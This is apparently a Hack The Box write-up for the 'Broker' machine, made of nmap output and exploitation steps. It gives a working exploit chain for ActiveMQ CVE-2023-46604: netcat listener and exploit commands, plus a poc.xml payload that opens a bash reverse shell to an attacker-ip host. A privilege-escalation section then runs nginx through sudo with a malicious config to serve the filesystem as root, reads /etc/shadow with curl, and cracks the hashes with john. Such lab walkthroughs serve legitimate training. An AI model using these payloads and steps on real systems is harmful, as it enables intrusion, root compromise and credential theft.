# Broker

## Nmap

```console
PORT STATE SERVICE REASON VERSION
22/tcp open ssh syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
| 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open http syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Error 401 Unauthorized
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_ basic realm=ActiveMQRealm
1883/tcp open mqtt syn-ack ttl 63
| mqtt-subscribe:
| Topics and their most recent payloads:
| ActiveMQ/Advisory/Consumer/Topic/#:
|_ ActiveMQ/Advisory/MasterBroker:
5672/tcp open amqp? syn-ack ttl 63
|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
| fingerprint-strings:
| DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie:
| AMQP
| AMQP
| amqp:decode-error
|_ 7Connection from client using unsupported AMQP attempted
8161/tcp open http syn-ack ttl 63 Jetty 9.4.39.v20210325
|_http-server-header: Jetty(9.4.39.v20210325)
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_ basic realm=ActiveMQRealm
|_http-title: Error 401 Unauthorized
33607/tcp open tcpwrapped syn-ack ttl 63
61613/tcp open stomp syn-ack ttl 63 Apache ActiveMQ
| fingerprint-strings:
| HELP4STOMP:
| ERROR
| content-type:text/plain
| message:Unknown STOMP action: HELP
| org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
| org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)
| org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
| org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
| org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
| org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
|_ java.lang.Thread.run(Thread.java:750)
```

## activemq

* Version of the Active MQ available on the site is 5.15.15
* which is vulnerable to CVE-2023-46604
* can be exploited via [https://github.com/evkl1d/CVE-2023-46604](https://github.com/evkl1d/CVE-2023-46604) and the following commands

```bash
$ nc -lvnp 9001

$python3 -m http.server 80

$ python3 exploit.py -i machine-ip -p 61616 -u http://attacker-ip/poc.xml
```

* contents of poc.xml

```xml
<?xml version="1.0" encoding="UTF-8" ?>
    <beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg>
            <list>
                <value>bash</value>
                <value>-c</value>
                <value>bash -i &gt;&amp; /dev/tcp/attacker-ip/9001 0&gt;&amp;1</value>
            </list>
            </constructor-arg>
        </bean>
    </beans>
```

## User-own

* The shell from the previous exploit returns as below

![rev](/HTB/Machines/images/broker-rev.png)

## Privilege Escalation

* when we check what privileges we have as the activemq user

```bash
$sudo -l
```

![privs](/HTB/Machines/images/broker-privs.png)

* we can create a malicious configuration file as mentioned below, then host it via nginx and read the file system as since the conf is being read as root and from /

```conf
user root;
events {
    worker_connections 1024;
}
http {
    server {
        listen 1337;
        root /;
        autoindex on;
    }
}
```

```bash
sudo /usr/sbin/nginx -c hack.conf
curl localhost:1337/etc/shadow
curl localhost:1337/etc/shadow

```

* we can crack the credentials with john or hashcat once they're unshadowed as follows

```bash
$unshadow passwd.txt shadow.txt > unshadowed.txt
$ john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

```

* then we can either ssh or sudo su onto the box via the revshell earlier
